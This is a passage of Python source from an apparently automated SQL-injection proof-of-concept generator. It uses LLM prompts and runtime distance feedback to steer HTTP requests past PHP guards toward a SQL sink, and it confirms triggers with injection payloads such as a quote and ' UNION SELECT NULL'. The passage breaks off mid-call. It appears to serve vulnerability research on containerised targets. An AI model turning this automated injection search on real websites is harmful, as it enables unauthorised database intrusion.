def _summarize_trace(trace) -> str:
    lines = [
        f"  blockers emitted: {trace.total_blockers_emitted}",
        f"  min_distance:     {trace.min_distance}",
        f"  reached_sink:     {trace.outcome.reached_sink}",
    ]
    if trace.terminal_blocker:
        tb = trace.terminal_blocker
        loc = tb.location
        lines.append(
            f"  terminal blocker: {tb.kind} @ "
            f"{osp.basename(loc.get('file', ''))}:{loc.get('line', '?')} "
            f"({loc.get('opcode', '')})"
        )
    return "\n".join(lines)


_INSTR_INSTALLED: set = set()


def _signal_channel_attribution(R_mal, R_base) -> dict:
    toks = do._DB_ERROR_TOKENS

    def _tok(src) -> set:
        try:
            low = (src.decode("latin-1", "replace")
                   if isinstance(src, (bytes, bytearray)) else (src or "")).lower()
        except Exception:
            low = ""
        return {t for t in toks if t.lower() in low}

    recv_mal, recv_base = _tok(R_mal.recv_capture), _tok(R_base.recv_capture)
    body_mal, body_base = _tok(R_mal.response_body), _tok(R_base.response_body)
    recv_only = sorted(recv_mal - recv_base)
    body_only = sorted(body_mal - body_base)
    crash = (R_mal.http_status == 0 and not (R_mal.response_body or "").strip())
    if recv_only and body_only:
        attribution = "both"
    elif recv_only:
        attribution = "recv"
    elif body_only:
        attribution = "body"
    elif crash:
        attribution = "crash"
    else:
        attribution = "none"
    return {
        "attribution": attribution,
        "recv_new_tokens": recv_only,
        "body_new_tokens": body_only,
        "recv_mal_tokens": sorted(recv_mal),
        "body_mal_tokens": sorted(body_mal),
        "elapsed_delta_ms": (R_mal.elapsed_ms or 0) - (R_base.elapsed_ms or 0),
        "mal_recv_bytes": R_mal.recv_size,
        "mal_http_status": R_mal.http_status,
    }


def _reach_confirm_trigger(
    entry_url, pipeline, cur_params, discovered_sources,
    resolved_headers, args, sink_file, sink_line, *, iter_index,
):
    from urllib.parse import urlencode

    mutables = _identify_mutable_params(
        pipeline, cur_params,
        sink_file=sink_file, sink_line=sink_line,
        working_dir=args.working_dir,
    )
    for _k in (discovered_sources or {}):
        if _k not in mutables:
            mutables = list(mutables) + [_k]
    _dpc = ((pipeline.get("constraints") or {}).get("injection_param_schema")
            or {}).get("dispatch_param_candidates")
    _dpc_param = _dpc.get("param") if isinstance(_dpc, dict) else None
    if _dpc_param:
        mutables = [m for m in mutables if m != _dpc_param]
    _inj = ((pipeline.get("constraints") or {}).get("injection_param_schema")
            or {}).get("inject_param")
    if _inj:
        mutables = [_inj] + [m for m in mutables if m != _inj]
    if not mutables:
        return {"triggered": False, "reason": "no payload-bearing param identified"}

    _ps = (pipeline.get("constraints", {}) or {}).get("param_sources", {}) or {}
    _vt = (args.vuln_type or "sqli").lower()
    if _vt == "sqli":
        payloads = ["'", " UNION SELECT NULL"]
    else:
        payloads, _ = _select_payloads(_vt)

    _b_gp = {k: v for k, v in cur_params.items() if (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
    _b_pp = {k: v for k, v in cur_params.items() if not (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
    _b_method = "GET" if (_b_gp and not _b_pp) else "POST"
    R_base = do.observe(
        label="reach_confirm[baseline]", container=args.container,
        entry_url=entry_url, body=_php_urlencode(_b_pp),
        extra_headers=resolved_headers, sentinel_uuid="", http_method=_b_method,
        get_query=_php_urlencode(_b_gp), override_keys=set(),
    )
    _b_trig, _b_tokens = do.predator_oracle(R_base)
    _b_crash = (R_base.http_status == 0 and not (R_base.response_body or "").strip())
    if _b_trig or _b_crash:
        _why = ("baseline already returns a DB-error packet ("
                + ", ".join(_b_tokens) + ")") if _b_trig \
               else "baseline already crashes the worker (HTTP 000)"
        print(f"  ⚠ predator confirm unsound here — {_why}; NOT attributing to a "
              f"payload (deferring to differential Phase B)")
        return {"triggered": False,
                "reason": f"baseline already errors: {_why}"}

    print(f"  ⤷ in-loop trigger probe (predator oracle): "
          f"params={mutables}  payloads={len(payloads)}")
    for param in mutables:
        for payload in payloads:
            mal = dict(cur_params)
            _cur = mal.get(param, "")
            if isinstance(_cur, list):
                _elem = (str(_cur[0]) if _cur else "1") + payload
                mal[param] = [_elem] + list(_cur[1:])
            else:
                mal[param] = str(_cur) + payload
            _gp = {k: v for k, v in mal.items() if (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
            _pp = {k: v for k, v in mal.items() if not (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
            method = "GET" if (_gp and not _pp) else "POST"
            R = do.observe(
                label=f"reach_confirm[{param}={payload!r}]",
                container=args.container, entry_url=entry_url,
                body=_php_urlencode(_pp), extra_headers=resolved_headers,
                sentinel_uuid="", http_method=method,
                get_query=_php_urlencode(_gp), override_keys={param},
            )
            triggered, tokens = do.predator_oracle(R)
            crash = (R.http_status == 0 and not (R.response_body or "").strip())
            if triggered or crash:
                reason = ("DB-error packet: " + ", ".join(tokens)) if triggered \
                    else "HTTP 000 + empty body (worker SIGSEGV at sink)"
                print(f"    ✓ TRIGGER param={param!r} payload={payload!r} → {reason}")
                return {
                    "triggered": True, "param": param, "payload": payload,
                    "tokens": tokens, "http_status": R.http_status,
                    "recv_size": R.recv_size, "reason": reason,
                    "iter_index": iter_index,
                    "signal_channel": _signal_channel_attribution(R, R_base),
                }
    return {"triggered": False,
            "reason": "no DB error / crash on any payload-bearing param"}


def _llm_reach_mutate(*, sink, guard_loc, guard_target, op1_value, condition_value,
                      controlling_param, cur_params, terminal_src="", dead_hints=None,
                      allowed_params=None,
                      llm_call_output_dir=None, llm_call_index=None):
    want = "TRUE" if guard_target.get("want_true") else "FALSE"
    td, ed = guard_target.get("then_dist"), guard_target.get("else_dist")
    _ctrl = (f"\n  Static-analysis hint: HTTP parameter '{controlling_param}' controls this guard's predicate."
             if controlling_param else "")
    _src = (f"\n  source near the guard:\n{terminal_src}" if terminal_src else "")
    _dead = (("\n  WARNING: the following directions were already tried with no distance improvement (stuck in a local optimum); use a different parameter or value, do not repeat:\n"
              + "\n".join(f"    - {h}" for h in dead_hints)) if dead_hints else "")
    _allow = (("\n\nWARNING hard constraint: you may only modify the parameters below that **actually exist in the HTTP request** -- they are your only means of controlling program execution flow. Never invent names that are not in the request (especially PHP-internal variables such as run_query/"
               "results/sql_query/rule: these are computed by server-side code from the DB or other parameters, so stuffing such a key into the request has no effect). The only parameters you can change are:\n  " + ", ".join(sorted(allowed_params)))
              if allowed_params else "")
    prompt = f"""You are guiding an HTTP request step by step toward a SQL sink. The current request is stuck at an if guard; you need to change request parameters so control flow moves closer to the sink.

SINK (final target): {sink.get('file')}:{sink.get('line')}
STUCK GUARD: {guard_loc.get('file')}:{guard_loc.get('line')}
  source: {guard_target.get('guard_code','')}
  runtime direction this time: condition currently = {condition_value} -- it took the [away-from-sink] side (that is why it is stuck).
  GOAL: make condition become {want} -- take the [closer-to-sink] side instead.
     rationale: distance from the then branch to the sink = {td}, from the else branch = {ed} (smaller means closer to the sink); the {want} side is closer to the sink.
     WARNING: the source is a full condition (may be a compound short-circuit `A or B` / `A and B`): to make the whole condition equal {want}, each operand's required value must be satisfied simultaneously.{_ctrl}{_src}{_dead}

current request parameters (change values or add missing keys):
{json.dumps(cur_params, ensure_ascii=False, indent=1)}{_allow}

Task: only change the parameters necessary to make this guard go {want}; leave everything else untouched.
Return strict JSON (no prose, no code fences):
{{"params": {{"key":"value", ...}}, "rationale": "one sentence: which parameter was changed and why it makes the guard go {want}"}}"""

    response = _llm_chat_resilient(prompt, stage="reach_mutate")
    if response is None:
        return dict(cur_params), "(LLM unavailable — all retries exhausted)"
    if llm_call_output_dir is not None and llm_call_index is not None:
        try:
            llm_call_output_dir.mkdir(parents=True, exist_ok=True)
            with (llm_call_output_dir / f"reach_call_{llm_call_index:02d}.txt").open(
                    "w", encoding="utf-8") as fh:
                fh.write(f"=== reach call #{llm_call_index} ===\n=== PROMPT ===\n"
                         f"{prompt}\n\n=== RESPONSE ===\n{response.get('content','')}\n")
        except Exception:
            pass
    content = response.get("content", "").strip()
    content = re.sub(r"^```(?:json)?\s*", "", content)
    content = re.sub(r"\s*```$", "", content).strip()
    data = None
    try:
        data = json.loads(content)
    except json.JSONDecodeError:
        try:
            data = json.loads(re.sub(r'\\(?![\\"/bfnrtu])', r'\\\\', content))
        except json.JSONDecodeError:
            data = None
    new = dict(cur_params)
    rationale = ""
    _dropped = []
    if isinstance(data, dict):
        for k, v in (data.get("params") or {}).items():
            if allowed_params is not None and str(k) not in allowed_params:
                _dropped.append(str(k))
                continue
            new[str(k)] = str(v)
        rationale = str(data.get("rationale", ""))
    if _dropped:
        rationale += f"  [dropped non-request parameters: {', '.join(_dropped)}]"
    return new, rationale


def _reach_guard_slice(guard_file, guard_line, *, pipeline_result, working_dir,
                       exit_line=None):
    proj_root = pipeline_result.get("_project_root_host") or ""
    cont_root = (pipeline_result.get("_container_root") or "").rstrip("/")
    host_path = guard_file or ""
    if cont_root and proj_root and host_path.startswith(cont_root):
        host_path = host_path.replace(cont_root, proj_root, 1)
    if not (host_path and Path(host_path).exists()):
        return ""
    gl = int(guard_line)
    if working_dir:
        try:
            _xl = int(exit_line) if exit_line else 0
            sl = _terminal_blocker_dataflow_slice(
                host_path, gl, working_dir,
                extra_seed_lines=([_xl] if _xl else None),
                cutoff_line=(_xl if _xl > gl else None))
            if sl:
                return sl
        except Exception:
            pass
    try:
        lines = Path(host_path).read_text(encoding="utf-8", errors="replace").splitlines()
    except OSError:
        return ""
    if gl < 1 or gl > len(lines):
        return ""
    lo, hi = max(1, gl - 25), min(len(lines), gl + 12)
    return "\n".join(f"  {'>>>' if ln == gl else '   '} {ln:>4}: {lines[ln-1]}"
                     for ln in range(lo, hi + 1))


def _llm_reach_unreachable_judge(*, sink, guard_loc, guard_code, guard_slice,
                                 history, plateau_kind, cur_params, want,
                                 controlling_param, explored_summary="",
                                 llm_call_output_dir=None, llm_call_index=None):
    _plat = {"stuck": "distance frozen / spinning on the same guard repeatedly (oscillation)",
             "regress_dead": "distance keeps growing, clearly drifting away from the sink"}.get(plateau_kind, plateau_kind)
    _hist = "\n".join(
        f"  iter{h.get('iter')}: guard {h.get('guard')} want={h.get('want')} "
        f"min_dist={h.get('min_dist')} | control param {h.get('ctrl_param')}={h.get('value')!r} "
        f"(then={h.get('then_dist')} else={h.get('else_dist')})"
        for h in (history or [])) or "  (no history)"
    prompt = f"""You are guiding an HTTP request step by step toward a SQL sink, and it is now **stuck**: {_plat}.
Judge overall whether this path truly cannot reach the sink (unreachable), or whether a different parameter/value could break through.

SINK (final target): {sink.get('file')}:{sink.get('line')}
CURRENT STUCK GUARD: {guard_loc.get('file')}:{guard_loc.get('line')}
  source: {guard_code}
  desired direction for this guard: {want} (which branch side is closer to the sink)
  static lookup: HTTP parameter {controlling_param!r} may control this guard's predicate.

GUARD data-flow slice (which lines/variables the predicate comes from, line numbers preserved, to see what actually controls it):
{guard_slice or '  (slice unavailable)'}

Exploration history of each guard on the path (check for oscillation between guards, whether distance really cannot be moved, which values were tried):
{_hist}

Distance-tree controllable branches already tried / still explorable (KEY: use this to judge "is there still an untried path"):
{explored_summary or '  (no controllable-branch info)'}

current request parameters:
{json.dumps(cur_params, ensure_ascii=False, indent=1)}

Criteria (KEY: distinguish "parameter affects the query condition" vs "parameter can produce a query result"):
- "unreachable": passing this guard depends on a precondition the HTTP parameters **cannot control**. The most common class is when the predicate ultimately comes from
  **the returned rows/count of a DB query** (db_fetch_cell / db_fetch_assoc / SELECT COUNT(*), etc.): even if some request parameter
  affects the query's WHERE/FROM/which table/which id, as long as the DB table has **no matching row**, the query still returns empty/0 and the
  guard can never pass. "Change snmp_query_id to something else, change id to something else" -- this kind of **changing the query condition** is by no means equivalent to
  **making a matching record appear in the DB out of thin air** -- these require backend-seeded data, so judge unreachable, and in the reason
  point out which table needs what seeded. Other unreachable cases: auth state / session variable / file state / constant config.
- "reachable": the predicate is **decided purely by the request parameter's own value** (e.g. if($_REQUEST['x']=='1'), or the value is concatenated into
  a string/arithmetic/comparison), without going through "the DB table must have data first"; the right value simply was not tried yet. Give a concrete breakthrough suggestion.

You are an **early-exit optimization**: only judge unreachable when you are **confident** (to save the cost of enumerating the whole tree). Key points:
  - **Hard rule**: look at "still explorable controllable branches" above. **As long as there is an untried presence-divert drop-key action
    (candidate 'absent(drop key)' is under 'not yet tried')**, you **almost cannot judge unreachable** -- dropping a request key that "diverts
    execution away from the sink whenever present" (typically some isset(\$_GET[..]) -> goes to another branch without the sink) is often exactly
    the key step toward the sink. **Unless you can explicitly argue "dropping this key also cannot change the current stuck guard's direction" (its presence
    is unrelated to the routing to the sink)**, otherwise always judge "reachable", give params {{}}, and let the caller finish trying these drop-key actions.
    Being currently stuck at an auth/permission method (such as isAddEvent) terminal **does not mean the earlier diverting keys should not be dropped first** --
    those earlier diverting keys may simply have kept execution from reaching the branch it should.
  - Only when the **remaining explorable branches are empty (or only clearly-unrelated ones remain)** and, weighing "all guards on the path + each parameter's tried values", you judge
    **there really is no controllable branch that can break through** (purely a state precondition: missing DB data / auth state / session / constant, etc.), judge "unreachable".
  - If a parameter has repeatedly been pushed in some direction with distance never improving / drifting, that direction does not control the guard; do not repeat the same suggestion.

Return strict JSON (no prose, no code fences):
{{"verdict": "unreachable"|"reachable", "reason": "one-sentence rationale", "params": {{"key":"value"}}}}
(params only when reachable and there is a concrete suggestion, otherwise {{}})"""

    response = _llm_chat_resilient(prompt, stage="reach_unreachable")
    if response is None:
        return "reachable", "(LLM unavailable)", {}
    if llm_call_output_dir is not None and llm_call_index is not None:
        try:
            llm_call_output_dir.mkdir(parents=True, exist_ok=True)
            with (llm_call_output_dir / f"reach_judge_{llm_call_index:02d}.txt").open(
                    "w", encoding="utf-8") as fh:
                fh.write(f"=== reach unreachable judge #{llm_call_index} ===\n"
                         f"=== PROMPT ===\n{prompt}\n\n=== RESPONSE ===\n"
                         f"{response.get('content','')}\n")
        except Exception:
            pass
    content = response.get("content", "").strip()
    content = re.sub(r"^```(?:json)?\s*", "", content)
    content = re.sub(r"\s*```$", "", content).strip()
    data = None
    try:
        data = json.loads(content)
    except json.JSONDecodeError:
        try:
            data = json.loads(re.sub(r'\\(?![\\"/bfnrtu])', r'\\\\', content))
        except json.JSONDecodeError:
            data = None
    if not isinstance(data, dict):
        return "reachable", "(LLM response could not be parsed)", {}
    verdict = str(data.get("verdict", "reachable")).strip().lower()
    if verdict not in ("unreachable", "reachable"):
        verdict = "reachable"
    reason = str(data.get("reason", ""))
    params = {}
    if verdict == "reachable":
        for k, v in (data.get("params") or {}).items():
            params[str(k)] = str(v)
    return verdict, reason, params


def _reach_tree_rebase(*, guard_line, branch_tree, cur_params, tried_cand):
    from module2_runtime_feedback.branch_tree import _order_key
    order = sorted(branch_tree.params.values(), key=_order_key)

    def _next_untried(node):
        ts = tried_cand.setdefault(node.param, set())
        cv = cur_params.get(node.param)
        if cv is not None:
            ts.add(str(cv))
        for c in node.candidates:
            if str(c) not in ts:
                return c
        return None

    try:
        _gl = int(guard_line)
    except (TypeError, ValueError):
        _gl = None
    _ctrl = [n for n in order
             if any(int(b.get("line", -1) or -1) == _gl for b in n.controlled_branches)]
    for node in _ctrl + [n for n in order if n not in _ctrl]:
        if len(node.candidates) <= 1:
            continue
        nc = _next_untried(node)
        if nc is not None:
            tried_cand[node.param].add(str(nc))
            new = dict(cur_params)
            new[node.param] = str(nc)
            return {"params": new,
                    "why": f"switch controllable param {node.param}={nc!r} (candidate-set exploration, d={node.distance})"}
    return None


_PRESENCE_ABSENT = "\x00__VIPER_ABSENT__"

def _resolve_presence(params: dict) -> dict:
    return {k: v for k, v in params.items() if v != _PRESENCE_ABSENT}

def _add_presence_divert_nodes(branch_tree, predicate_lookahead, param_sources,
                               cur_params, url_qs_keys, exclude_keys=None):
    exclude_keys = set(exclude_keys or ())
    import re
    pat_isset = re.compile(
        r"isset\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([^'\"]+)['\"]")
    pat_ake = re.compile(
        r"array_key_exists\s*\(\s*['\"]([^'\"]+)['\"]\s*,\s*\$_(GET|POST|REQUEST|COOKIE)")
    added = []
    for p in predicate_lookahead or []:
        raw = p.get("raw_line") or ""
        keys = [m.group(2) for m in pat_isset.finditer(raw)] \
             + [m.group(1) for m in pat_ake.finditer(raw)]
        if not keys:
            continue
        try:
            else_f = float(p.get("false_dist"))
        except (TypeError, ValueError):
            continue
        if else_f < 0:
            continue
        try:
            then_f = float(p.get("then_dist"))
        except (TypeError, ValueError):
            then_f = float("inf")
        if not (then_f > else_f):
            continue
        for k in keys:
            if k not in param_sources or k in url_qs_keys:
                continue
            if k in exclude_keys:
                continue
            if k in branch_tree.params:
                continue
            present_val = str(cur_params.get(k, "1"))
            node = branch_tree.add_ranged_node(
                k, [_PRESENCE_ABSENT, present_val], else_f, source="presence")
            node.controlled_branches.append(
                {"file": p.get("file"), "line": p.get("line")})
            added.append((k, p.get("line"), else_f))
    return added


def _guard_request_controllable(line, raw_line, branch_tree, param_sources):
    try:
        ln = int(line)
    except (TypeError, ValueError):
        return False
    for n in branch_tree.params.values():
        for b in n.controlled_branches:
            try:
                if int(b.get("line", -1) or -1) == ln:
                    return True
            except (TypeError, ValueError):
                pass
    for m in re.finditer(r"\$_(?:GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([^'\"]+)", raw_line or ""):
        if m.group(1) in param_sources:
            return True
    return False


def _redirect_to_controllable_guard(terminal_line, branch_tree,
                                    predicate_lookahead, param_sources, cur_params,
                                    sink_basename):
    pl_by_line = {}
    for p in predicate_lookahead or []:
        if sink_basename in (p.get("file", "") or ""):
            try:
                pl_by_line[int(p.get("line", -1) or -1)] = p
            except (TypeError, ValueError):
                pass
    _tp = pl_by_line.get(terminal_line if isinstance(terminal_line, int) else -1)
    if _guard_request_controllable(terminal_line, (_tp or {}).get("raw_line", ""),
                                   branch_tree, param_sources):
        return None
    best = None
    for n in branch_tree.params.values():
        if n.source != "presence":
            continue
        if cur_params.get(n.param) == _PRESENCE_ABSENT:
            continue
        for b in n.controlled_branches:
            try:
                ln = int(b.get("line", -1) or -1)
            except (TypeError, ValueError):
                continue
            p = pl_by_line.get(ln)
            if not p:
                continue
            try:
                else_f = float(p.get("false_dist"))
            except (TypeError, ValueError):
                continue
            if else_f < 0:
                continue
            try:
                then_f = float(p.get("then_dist"))
            except (TypeError, ValueError):
                then_f = float("inf")
            if not (then_f > else_f):
                continue
            if best is None or else_f < best[0]:
                best = (else_f, {"file": p.get("file"), "line": ln,
                                 "opcode": (_tp or {}).get("opcode")})
    if best is None:
        return None
    return best[1], True


def _reach_exploration_summary(branch_tree, tried_cand, cur_params):
    from module2_runtime_feedback.branch_tree import _order_key
    if not branch_tree.params:
        return "  (probing did not tag any controllable-branch node)"
    lines = []
    for n in sorted(branch_tree.params.values(), key=_order_key):
        ts = set(tried_cand.get(n.param, set()))
        cv = cur_params.get(n.param)
        if cv is not None:
            ts.add(str(cv))
        def _disp(c):
            return "absent(drop key)" if c == _PRESENCE_ABSENT else repr(c)
        untried = [c for c in n.candidates if str(c) not in ts]
        kind = "presence-divert(droppable key)" if n.source == "presence" else n.source
        d = n.distance
        lines.append(
            f"  param {n.param} [{kind}, d={d}]: candidates={[_disp(c) for c in n.candidates]}; "
            f"tried={[_disp(c) for c in n.candidates if str(c) in ts]}; "
            f"not-yet-tried={[_disp(c) for c in untried] or 'none(exhausted)'}")
    return "\n".join(lines)


def _reach_from_entry(entry_url, pipeline, args, sink_file, sink_line,
                      resolved_headers, out, *, max_iters, deadline_ts,
                      drop_cookies, bootstrap_relogin):
    _resolved_headers = resolved_headers
    _drop_cookies = drop_cookies
    _bootstrap_relogin = bootstrap_relogin
    sink_file = pipeline["sink"]["file"]
    sink_line = int(pipeline["sink"]["line"])
    params = _build_initial_poc(pipeline)
    if _drop_cookies:
        _pdrop = [k for k in list(params) if any(tok in k for tok in _drop_cookies)]
        for k in _pdrop:
            params.pop(k, None)
        if _pdrop:
            print(f"[m3] dropped session-control cookies {_pdrop} from initial PoC params")

    from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
    _url_qs_keys = set(_parse_qs(_urlparse(entry_url).query, keep_blank_values=True).keys())
    if _url_qs_keys:
        _dropped = [k for k in params if k in _url_qs_keys]
        for k in _url_qs_keys:
            params.pop(k, None)
        if _dropped:
            print(f"[m3] froze entry_url dispatch params (kept in URL, not "
                  f"mutated): {_dropped}")

    if args.cookie_jar:
        _setup_path = Path(args.cookie_jar).parent / "setup_state.txt"
        if _setup_path.is_file():
            for ln in _setup_path.read_text().splitlines():
                if "=" not in ln:
                    continue
                k, v = ln.split("=", 1)
                k, v = k.strip(), v.strip()
                if not k or not v:
                    continue
                if k == "rule_id":
                    params["id"] = v
                    print(f"[m3] setup override: PoC id={v} (rule_id alias, "
                          f"from {_setup_path})")
                else:
                    params[k] = v
                    print(f"[m3] setup param: PoC {k}={v} (from {_setup_path})")

    print(f"[m3] entry URL: {entry_url}")
    print(f"[m3] sink: {sink_file}:{sink_line}")
    print(f"[m3] initial PoC params: {params}")

    instr_info_host = Path(args.pipeline_result).parent / "instr-info.csv"
    project_root_host = (args.project_root_host
                          or str(Path(pipeline["entry_file"]).parent))
    if args.container not in _INSTR_INSTALLED:
        _INSTR_INSTALLED.add(args.container)
        if _install_instr_info_in_container(
            args.container, str(instr_info_host), project_root_host,
            project_root_in_container=args.container_root,
        ):
            print(f"[m3] installed instr-info.csv → {args.container}:/tmp/instr-info.csv "
                  f"(paths rewritten: {project_root_host} → {args.container_root})")
            _docker_exec(args.container, "supervisorctl restart apache2 >/dev/null 2>&1")
            import time; time.sleep(1)
        else:
            print(f"[m3] WARN: failed to install instr-info.csv; distance will be -1")


    history = RunHistory()
    from urllib.parse import urlencode
    cur_params = params
    last_response = ""
    iter_index = 0
    crashed = False

    from module2_runtime_feedback.frontier import FrontierTracker
    tracker = FrontierTracker.from_pipeline(
        pipeline, budget=args.budget, plateau_patience=args.plateau_patience)

    p6_engine = None
    if args.working_dir:
        from module2_runtime_feedback.runtime_feedback import RuntimeFeedbackEngine
        p6_engine = RuntimeFeedbackEngine(
            working_dir=Path(args.working_dir),
            instr_info_host=instr_info_host,
            target_spec=f"{sink_file}:{sink_line}",
            container=args.container,
            project_root_host=project_root_host,
            project_root_in_container=args.container_root,
        )
        print(f"[m3] P6 closed-loop ENABLED (working_dir={args.working_dir})")

    _llm_call_counter = 0
    _phase_a_t0 = __import__("time").perf_counter()
    reach_blocked_verdict = None
    reach_unreachable = None
    _STATE_PRECOND_PATIENCE = tracker.budget
    discovered_sources: dict = {}
    result = None
    cur_params = dict(params)
    cur_body = ""
    iter_index = 0
    reach_trigger = None

    from module2_runtime_feedback.branch_probe import build_nonce_assignment, probe as _probe_branches
    from module2_runtime_feedback.branch_tree import ControllableBranchTree, SearchCursor
    _base_params = dict(params)
    _branch_tree = ControllableBranchTree()
    if args.bootstrap_url:
        _bootstrap_relogin()
    _probe_psrc = pipeline.get("constraints", {}).get("param_sources", {}) or {}
    _inj_schema = pipeline.get("constraints", {}).get("injection_param_schema") or {}
    _dpc = _inj_schema.get("dispatch_param_candidates") or {}
    _ranged = {}
    if _dpc.get("param") and _dpc.get("candidates"):
        _ranged[str(_dpc["param"])] = list(_dpc["candidates"])
    for _gc in pipeline.get("constraints", {}).get("sink_gate_constraints", []) or []:
        _gp = _gc.get("param")
        if not _gp:
            continue
        _req = _gc.get("required")
        _ch = (_gc.get("channel") or "REQUEST").upper()
        if _ch not in ("GET", "POST", "REQUEST", "COOKIE"):
            _ch = "REQUEST"
        if isinstance(_req, dict) and "eq" in _req:
            _val = str(_req["eq"])
        elif _req == "falsy":
            _val = ""
        else:
            if _gp not in _base_params:
                _base_params[_gp] = "1"
                params[_gp] = "1"
                _probe_psrc.setdefault(_gp, _ch)
                print(f"[m3] sink-gate: {_gp} needs truthy but missing -> fill '1' (channel={_ch}, @line {_gc.get('line')})")
            continue
        _ranged[str(_gp)] = [_val]
        _base_params[_gp] = _val
        params[_gp] = _val
        _probe_psrc.setdefault(_gp, _ch)
        print(f"[m3] sink-gate: {_gp} must be {_req} -> fixed to {_val!r} (channel={_ch}, @line {_gc.get('line')})")
    _inj_param_keys = set(re.findall(
        r"\$_(?:GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([^'\"]+)['\"]",
        (pipeline.get("constraints", {}).get("sink") or {}).get("statement", "") or ""))
    for _ic in pipeline.get("constraints", {}).get("injection_chain", []) or []:
        _vn = _ic.get("varname") if isinstance(_ic, dict) else None
        if _vn and _vn in _probe_psrc:
            _inj_param_keys.add(_vn)
    _probe_targets = [k for k in _base_params
                      if k not in _url_qs_keys and k not in _ranged
                      and k != "action" and k not in _inj_param_keys]
    if _inj_param_keys:
        print(f"[m3] injection params excluded from branch probing (kept benign, payload handled by oracle): {sorted(_inj_param_keys)}")
    for _t in _probe_targets:
        _asg1, _nm1 = build_nonce_assignment([_t])
        _branch_tree.nonce_map.update(_nm1)
        _probe_full = {**_base_params, **_asg1}

        def _send_probe(_pf=_probe_full, _tn=_t):
            _g, _p, _c = _split_params_by_source(_pf, _probe_psrc)
            if _url_qs_keys:
                _g = {k: v for k, v in _g.items() if k not in _url_qs_keys}
                _p = {k: v for k, v in _p.items() if k not in _url_qs_keys}
            _m = "GET" if (_g and not _p and not _c) else "POST"
            do.observe(label=f"branch-probe[{_tn}]", container=args.container,
                       entry_url=entry_url, body=_php_urlencode(_p),
                       extra_headers=_resolved_headers, sentinel_uuid="",
                       http_method=_m, get_query=_php_urlencode(_g))

        try:
            _ev = _probe_branches(args.container, _send_probe)
            from module2_runtime_feedback.blocker_aggregator import patch_distances_into_raw
            patch_distances_into_raw(_ev, str(instr_info_host))
            _branch_tree.ingest_probe(_ev)
        except Exception as _e:
            print(f"[m3] branch probe {_t} failed: {type(_e).__name__}: {_e}")
    for _rp, _cands in _ranged.items():
        _finite = [n.distance for n in _branch_tree.params.values()
                   if n.distance is not None and n.distance >= 0]
        _rdist = (max(_finite) + 1.0) if _finite else 100.0
        _branch_tree.add_ranged_node(_rp, _cands, _rdist)
    _sink_stmt = (pipeline.get("constraints", {}).get("sink") or {}).get("statement", "") or ""
    _sink_vars = set(re.findall(r"\$(\w+)", _sink_stmt))
    _inj_sink_keys = set(
        re.findall(r"\$_(?:GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([^'\"]+)['\"]\s*\]", _sink_stmt))
    for _ic in pipeline.get("constraints", {}).get("injection_chain", []) or []:
        _src = _ic.get("source", "") if isinstance(_ic, dict) else str(_ic)
        _m = re.search(
            r"\$(\w+)\s*=\s*\$_(?:GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([^'\"]+)", _src)
        if _m and _m.group(1) in _sink_vars:
            _inj_sink_keys.add(_m.group(2))
    _pres_added = _add_presence_divert_nodes(
        _branch_tree,
        pipeline.get("constraints", {}).get("predicate_lookahead", []) or [],
        _probe_psrc, _base_params, _url_qs_keys, exclude_keys=_inj_sink_keys)
    if _pres_added:
        print(f"[m3] presence-divert nodes (divert when present, droppable): {_pres_added}")
    print(f"[m3] branch probing: nonce tests {len(_probe_targets)} without range + {len(_ranged)} "
          f"with existing range -> decision nodes "
          f"{[(p, len(n.candidates), round(n.distance, 1) if n.distance is not None else None) for p, n in _branch_tree.params.items()]}")
    _cursor = SearchCursor(_branch_tree)


    from module2_runtime_feedback.reach_guard import CpgIndex, resolve_guard_target
    from module2_runtime_feedback.blocker_aggregator import _load_distance_table
    _pred_lookahead = pipeline.get("constraints", {}).get("predicate_lookahead", []) or []
    _dist_table, _dist_keyer = _load_distance_table(str(instr_info_host))
    _cpg_idx = None
    _reach_params = dict(_base_params)
    _reach_llm_calls = 0
    _reached = False
    _reach_best_dist = float("inf")
    _reach_best_params = None
    _reach_dead = []
    _reach_history = []
    _unreachable_judged_at = 0
    _reach_allowed = (set((pipeline.get("constraints", {}).get("param_sources", {}) or {}).keys())
                      | set(_base_params.keys()))
    _reach_tried_cand = {}
    for i in range(1, max_iters + 1):
        import time as _t
        if deadline_ts and _t.perf_counter() >= deadline_ts:
            print(f"[m3] reach phase wallclock deadline hit at iter {i}"); break
        if args.bootstrap_url:
            _bootstrap_relogin()
        _psrc = pipeline.get("constraints", {}).get("param_sources", {}) or {}
        _gp, _pp, _cp = _split_params_by_source(_resolve_presence(_reach_params), _psrc)
        if _url_qs_keys:
            _gp = {k: v for k, v in _gp.items() if k not in _url_qs_keys}
            _pp = {k: v for k, v in _pp.items() if k not in _url_qs_keys}
        _m = "GET" if (_gp and not _pp and not _cp) else "POST"
        print(f"\n══════ reach iter {i}  [phase=entry→reach] ══════")
        print(f"  PoC: {_php_urlencode(_pp) or '(empty)'}{(' | GET '+_php_urlencode(_gp)) if _gp else ''}")
        result = run_iteration(
            iteration_index=i, container=args.container, entry_url=entry_url,
            post_body=_php_urlencode(_pp), output_dir=out,
            sink_file=sink_file, sink_line=sink_line, extra_headers=_resolved_headers,
            post_sink_lines=set(pipeline.get("constraints", {}).get("post_sink_lines", []) or []),
            sink_enclosing_if_lines=set(pipeline.get("constraints", {}).get("sink_enclosing_if_lines", []) or []),
            pre_sink_lines=set(pipeline.get("constraints", {}).get("pre_sink_lines", []) or []),
            sink_enclosing_if_body_ranges=pipeline.get("constraints", {}).get("sink_enclosing_if_body_ranges", []) or [],
            sink_inside_if=pipeline.get("constraints", {}).get("sink_inside_if"),
            file_whitelist=set(pipeline.get("constraints", {}).get("in_scope_files", []) or []),
            get_query=_php_urlencode(_gp), cookies=_cp if _cp else None,
